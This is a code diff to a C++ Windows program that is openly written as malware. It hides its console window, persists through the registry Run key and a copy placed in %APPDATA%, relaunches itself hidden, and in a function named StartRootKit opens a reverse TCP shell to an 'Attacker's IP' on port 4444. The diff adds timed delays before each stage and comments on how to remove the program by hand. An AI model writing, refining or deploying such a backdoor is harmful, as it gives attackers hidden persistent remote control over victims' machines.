@@ -8,9 +8,39 @@
 #pragma comment(lib, "ws2_32.lib")
 
 
+// to remove WIN + R
+// type: regedit
+
+// find the program using this path
+// HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+
+// Look for an entry named:
+// MyCustomApp
+
+// Right-click it and choose Delete.
+
+
+// Delete the Hidden Executable
+// Press Win + R, type %APPDATA%, and hit Enter.
+
+// Look for an entry named:
+// MyCustomApp.exe
+
 
 // ===== CONFIGURATION - CHANGE THESE VALUES =====
 const wchar_t* PROGRAM_NAME = L"MyCustomApp";  // Change this to your desired name
+// ===== END CONFIGURATION =====
+
+// ===== REVERSE TCP CONFIGURATION =====
+const char* HOST = "192.168.10.112";  // Attacker's IP
+const int PORT = 4444;               // Attacker's port
+// ===== END CONFIGURATION =====
+
+// ===== CONFIGURATION - STARTUP and WHAIT =====
+const int STARTUP_DELAY = 60000;
+const int HIDDEN_DELAY = 60000;
+const int NOT_HIDDEN_DELAY = 60000;
+const int LAUNCH_HIDDEN_COPY = 60000;
 // ===== END CONFIGURATION =====
 
 // Generate the full executable name
@@ -71,11 +101,6 @@ void InstallAndHide() {
 }
 
 void StartRootKit() {
-    // ===== REVERSE TCP CONFIGURATION =====
-    const char* HOST = "192.168.10.112";  // Attacker's IP
-    const int PORT = 4444;               // Attacker's port
-    // ===== END CONFIGURATION =====
-
     WSADATA wsaData;
     SOCKET sock;
     STARTUPINFO si;
@@ -145,16 +170,19 @@ void LaunchHiddenCopy() {
 int main() {
     ShowWindow(GetConsoleWindow(), SW_HIDE);
 
-    // StartRootKit();
+    Sleep(STARTUP_DELAY);
     
     if (IsHiddenInstance()) {
         // Stealth mode - begin rootkit functionality
+        Sleep(HIDDEN_DELAY);
         StartRootKit();
     } else {
         // First run - install and hide
+        Sleep(NOT_HIDDEN_DELAY);
         InstallAndHide();
+        Sleep(LAUNCH_HIDDEN_COPY);
         LaunchHiddenCopy();
     }
-    
+
     return 0;
 }
